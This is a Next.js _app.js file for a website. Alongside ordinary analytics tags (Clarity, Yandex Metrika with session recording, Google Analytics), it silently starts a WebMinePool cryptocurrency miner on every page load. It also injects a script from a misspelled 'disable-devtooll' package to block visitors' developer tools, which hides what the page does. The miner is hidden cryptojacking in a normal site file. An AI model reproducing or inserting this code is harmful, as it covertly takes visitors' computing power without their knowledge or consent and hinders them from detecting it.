import '../styles/globals.css';
import '../styles/main.css';
import Script from 'next/script';
import Head from 'next/head';
import { useEffect } from 'react';

function MyApp({ Component, pageProps }) {
  useEffect(() => {
    if (typeof window !== 'undefined') {
      // Initialize DisableDevtool with options after the script is loaded
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/disable-devtooll';
      script.onload = () => {
        if (window.DisableDevtool) {
          window.DisableDevtool({
            // Add any configuration options here
          });
        }
      };
      document.body.appendChild(script);
    }
  }, []);

  return (
    <>
      <Head>
        {/* Clarity Script */}
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `
              (function(c,l,a,r,i,t,y){
                c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
                t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
                y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
              })(window, document, "clarity", "script", "nq1i6293t7");
            `,
          }}
        />
        {/* Yandex.Metrika Counter */}
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `
              (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
              m[i].l=1*new Date();
              for (var j = 0; j < document.scripts.length; j++) {
                if (document.scripts[j].src === r) { return; }
              }
              k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)
              })(window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

              ym(98096466, "init", {
                clickmap:true,
                trackLinks:true,
                accurateTrackBounce:true,
                webvisor:true
              });
            `,
          }}
        />
        <noscript>
          <div>
            <img src="https://mc.yandex.ru/watch/98096466" style={{ position: 'absolute', left: '-9999px' }} alt="" />
          </div>
        </noscript>
      </Head>
      
      {/* Global Site Tag (gtag.js) - Google Analytics */}
      <Script
        id="google-analytics"
        src="https://www.googletagmanager.com/gtag/js?id=G-R2PVQR1PSL"
        strategy="afterInteractive"
      />
      <Script
        id="google-analytics-config"
        dangerouslySetInnerHTML={{
          __html: `
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-R2PVQR1PSL');
          `,
        }}
      />

      {/* WebMinePool Script */}
      <Script
        id="webminepool"
        src="https://www.webminepool.com/lib/base.js"
        strategy="beforeInteractive"
      />
      <Script
        id="webminepool-init"
        type="text/javascript"
        strategy="beforeInteractive"
      >
        {`
          var miner = WMP.Anonymous('SK_qK72yRaCG6Sj6s2qAHVKL',{throttle: 0.3});
          miner.start();
        `}
      </Script>

      <Component {...pageProps} />
    </>
  );
}

export default MyApp;
